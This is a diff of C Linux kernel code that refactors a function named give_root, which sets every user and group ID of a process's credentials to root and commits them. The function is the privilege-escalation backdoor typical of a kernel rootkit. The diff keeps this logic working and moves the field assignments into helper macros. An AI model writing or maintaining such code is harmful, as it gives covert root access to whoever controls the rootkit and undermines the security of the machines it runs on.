@@ -6,10 +6,7 @@
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/printk.h>
-
-
-#define ROOT_UID 0 // The root user ID
-#define ROOT_GID 0 // The root group ID
+#include <linux/types.h>
 
 void give_root(const pid_t i32_pid, const int i32_sig)
 {
@@ -23,14 +20,8 @@ void give_root(const pid_t i32_pid, const int i32_sig)
         return;
     }
 
-    p_creds->uid.val   = ROOT_UID;
-    p_creds->gid.val   = ROOT_GID;
-    p_creds->suid.val  = ROOT_UID;
-    p_creds->sgid.val  = ROOT_GID;
-    p_creds->euid.val  = ROOT_UID;
-    p_creds->egid.val  = ROOT_GID;
-    p_creds->fsuid.val = ROOT_UID;
-    p_creds->fsgid.val = ROOT_GID;
+    __SET_UIDS(p_creds, ROOT_UID);
+    __SET_GIDS(p_creds, ROOT_GID);
 
     commit_creds(p_creds);
 
